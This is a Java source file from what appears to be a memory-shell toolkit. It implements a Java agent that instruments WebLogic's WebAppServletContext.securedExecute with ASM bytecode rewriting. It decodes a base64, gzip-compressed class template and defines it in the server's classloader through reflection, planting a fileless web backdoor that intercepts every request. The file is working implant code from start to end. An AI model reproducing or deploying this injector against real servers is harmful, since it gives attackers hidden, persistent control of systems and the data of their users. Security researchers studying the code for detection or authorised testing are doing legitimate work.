package com.reajason.javaweb.memshell.injector.weblogic;

import org.objectweb.asm.*;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.Instrumentation;
import java.security.ProtectionDomain;
import java.util.zip.GZIPInputStream;

/**
 * @author ReaJason
 * @since 2025/3/26
 */
public class WebLogicServletContextAgentInjector implements ClassFileTransformer {
    private static final String TARGET_CLASS = "weblogic/servlet/internal/WebAppServletContext";
    private static final String TARGET_METHOD_NAME = "securedExecute";

    public static String getClassName() {
        return "{{advisorName}}";
    }

    public static String getBase64String() {
        return "{{base64String}}";
    }

    public static void premain(String args, Instrumentation inst) throws Exception {
        launch(inst);
    }

    public static void agentmain(String args, Instrumentation inst) throws Exception {
        launch(inst);
    }

    private static void launch(Instrumentation inst) throws Exception {
        System.out.println("MemShell Agent is starting");
        inst.addTransformer(new WebLogicServletContextAgentInjector(), true);
        for (Class<?> allLoadedClass : inst.getAllLoadedClasses()) {
            String name = allLoadedClass.getName();
            if (TARGET_CLASS.replace("/", ".").equals(name)) {
                inst.retransformClasses(allLoadedClass);
                System.out.println("MemShell Agent is working at weblogic.servlet.internal.WebAppServletContext.securedExecute");
            }
        }
    }

    @Override
    @SuppressWarnings("all")
    public byte[] transform(final ClassLoader loader, String className, Class<?> classBeingRedefined,
                            ProtectionDomain protectionDomain, byte[] bytes) {
        if (TARGET_CLASS.equals(className)) {
            defineTargetClass(loader);
            try {
                ClassReader cr = new ClassReader(bytes);
                ClassWriter cw = new ClassWriter(cr, ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES) {
                    @Override
                    protected ClassLoader getClassLoader() {
                        return loader;
                    }
                };
                ClassVisitor cv = getClassVisitor(cw);
                cr.accept(cv, ClassReader.EXPAND_FRAMES);
                return cw.toByteArray();
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return bytes;
    }

    @SuppressWarnings("all")
    public static ClassVisitor getClassVisitor(ClassVisitor cv) {
        return new ClassVisitor(Opcodes.ASM9, cv) {
            @Override
            public MethodVisitor visitMethod(int access, String name, String descriptor,
                                             String signature, String[] exceptions) {
                MethodVisitor mv = super.visitMethod(access, name, descriptor, signature, exceptions);
                if (TARGET_METHOD_NAME.equals(name)) {
                    try {
                        Type[] argumentTypes = Type.getArgumentTypes(descriptor);
                        return new AgentShellMethodVisitor(mv, argumentTypes, getClassName());
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
                return mv;
            }
        };
    }

    public static class AgentShellMethodVisitor extends MethodVisitor {
        private final Type[] argumentTypes;
        private final String className;

        public AgentShellMethodVisitor(MethodVisitor mv, Type[] argTypes, String className) {
            super(Opcodes.ASM9, mv);
            this.argumentTypes = argTypes;
            this.className = className;
        }

        @Override
        public void visitCode() {
            loadArgArray();
            Label tryStart = new Label();
            Label tryEnd = new Label();
            Label catchHandler = new Label();
            Label ifConditionFalse = new Label();
            Label skipCatchBlock = new Label();
            mv.visitTryCatchBlock(tryStart, tryEnd, catchHandler, "java/lang/Throwable");

            mv.visitLabel(tryStart);
            String internalClassName = className.replace('.', '/');
            mv.visitTypeInsn(Opcodes.NEW, internalClassName);
            mv.visitInsn(Opcodes.DUP);
            mv.visitMethodInsn(Opcodes.INVOKESPECIAL, internalClassName, "<init>", "()V", false);
            mv.visitInsn(Opcodes.SWAP);
            mv.visitMethodInsn(Opcodes.INVOKEVIRTUAL,
                    "java/lang/Object",
                    "equals",
                    "(Ljava/lang/Object;)Z",
                    false);
            mv.visitJumpInsn(Opcodes.IFEQ, ifConditionFalse);
            mv.visitInsn(Opcodes.RETURN);
            mv.visitLabel(ifConditionFalse);
            mv.visitLabel(tryEnd);
            mv.visitJumpInsn(Opcodes.GOTO, skipCatchBlock);
            mv.visitLabel(catchHandler);
            mv.visitInsn(Opcodes.POP);
            mv.visitLabel(skipCatchBlock);
        }

        public void loadArgArray() {
            mv.visitIntInsn(Opcodes.SIPUSH, argumentTypes.length);
            mv.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/Object");
            for (int i = 0; i < argumentTypes.length; i++) {
                mv.visitInsn(Opcodes.DUP);
                push(i);
                Type argumentType = argumentTypes[i];
                mv.visitVarInsn(argumentType.getOpcode(Opcodes.ILOAD), getArgIndex(i));
                boxPrimitive(mv, argumentType);
                mv.visitInsn(Type.getType(Object.class).getOpcode(Opcodes.IASTORE));
            }
        }

        @SuppressWarnings("all")
        public void push(final int value) {
            if (value >= -1 && value <= 5) {
                mv.visitInsn(Opcodes.ICONST_0 + value);
            } else if (value >= Byte.MIN_VALUE && value <= Byte.MAX_VALUE) {
                mv.visitIntInsn(Opcodes.BIPUSH, value);
            } else if (value >= Short.MIN_VALUE && value <= Short.MAX_VALUE) {
                mv.visitIntInsn(Opcodes.SIPUSH, value);
            } else {
                mv.visitLdcInsn(new Integer(value));
            }
        }

        private int getArgIndex(final int arg) {
            int index = 1;
            for (int i = 0; i < arg; i++) {
                index += argumentTypes[i].getSize();
            }
            return index;
        }

        private void boxPrimitive(MethodVisitor mv, Type type) {
            if (type.getSort() == Type.OBJECT || type.getSort() == Type.ARRAY) {
                return; // Already an object
            }

            String owner;
            String descriptor;

            switch (type.getSort()) {
                case Type.BOOLEAN:
                    owner = "java/lang/Boolean";
                    descriptor = "(Z)Ljava/lang/Boolean;";
                    break;
                case Type.CHAR:
                    owner = "java/lang/Character";
                    descriptor = "(C)Ljava/lang/Character;";
                    break;
                case Type.BYTE:
                    owner = "java/lang/Byte";
                    descriptor = "(B)Ljava/lang/Byte;";
                    break;
                case Type.SHORT:
                    owner = "java/lang/Short";
                    descriptor = "(S)Ljava/lang/Short;";
                    break;
                case Type.INT:
                    owner = "java/lang/Integer";
                    descriptor = "(I)Ljava/lang/Integer;";
                    break;
                case Type.FLOAT:
                    owner = "java/lang/Float";
                    descriptor = "(F)Ljava/lang/Float;";
                    break;
                case Type.LONG:
                    owner = "java/lang/Long";
                    descriptor = "(J)Ljava/lang/Long;";
                    break;
                case Type.DOUBLE:
                    owner = "java/lang/Double";
                    descriptor = "(D)Ljava/lang/Double;";
                    break;
                default:
                    // Should not happen for primitive types
                    return;
            }
            mv.visitMethodInsn(Opcodes.INVOKESTATIC, owner, "valueOf", descriptor, false);
        }
    }

    @SuppressWarnings("all")
    public static byte[] decodeBase64(String base64Str) throws Exception {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        GZIPInputStream gzipInputStream = null;
        try {
            gzipInputStream = new GZIPInputStream(new ByteArrayInputStream(compressedData));
            byte[] buffer = new byte[4096];
            int n;
            while ((n = gzipInputStream.read(buffer)) > 0) {
                out.write(buffer, 0, n);
            }
            return out.toByteArray();
        } catch (Exception e) {
            throw new RuntimeException(e);
        } finally {
            try {
                if (gzipInputStream != null) {
                    gzipInputStream.close();
                }
                out.close();
            } catch (Exception ignored) {
            }
        }
    }

    @SuppressWarnings("all")
    public void defineTargetClass(ClassLoader loader) {
        try {
            loader.loadClass(getClassName());
            return;
        } catch (ClassNotFoundException ignored) {
        }
        try {
            byte[] classBytecode = gzipDecompress(decodeBase64(getBase64String()));
            java.lang.reflect.Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
            defineClass.setAccessible(true);
            defineClass.invoke(loader, classBytecode, 0, classBytecode.length);
        } catch (Exception ignored) {
        }
    }
}
